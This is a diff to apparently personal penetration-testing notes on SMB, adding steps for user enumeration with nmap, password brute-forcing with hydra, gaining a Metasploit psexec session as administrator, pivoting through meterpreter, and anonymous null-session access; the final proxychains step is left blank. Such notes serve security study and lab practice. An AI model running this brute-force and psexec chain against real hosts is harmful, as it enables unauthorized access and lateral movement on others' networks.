@@ -51,6 +51,30 @@ SMB lets you shares files , disks, directories, printers.
 
 > smbclient //192.168.x.x/folder
 
+3- Get SMB users
+
+> nmap  --script smb-enum-users.nse  192.168.x.x
+
+4- After list all users 
+
+> hydra -L users.txt -P /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt 192.168.x.x smb
+
+5- After getting the password use metasploit 
+
+> use exploit/windows/smb/psexec
+> set RHOSTS 192.168.x.x
+> set SMBUser administrator
+> set SMBPass password
+> exploit
+
+6- After get meterpreter session , the following can add route to the specific IP **(Pivoting)**
+
+> run autoroute 192.168.x2.x2/20
+
+7- Start the socks proxy server to access the pivot system on the attacker's machine using the proxychains tool.
+
+>
+
 ---
 
 * Null Session
@@ -61,6 +85,8 @@ gather information such as shares, users, groups, registry keys and much more.
 Null sessions rely on Common Internet File System (CIFS) and Server Message Block (SMB) API, that return information even to an unauthenticated user.
 
 > net use \\192.168.x.x\IPC$ "" /u:""
+
+> smbclient //192.168.x.x/folder      with anonymous username and password
 
 also using smbclient .
 
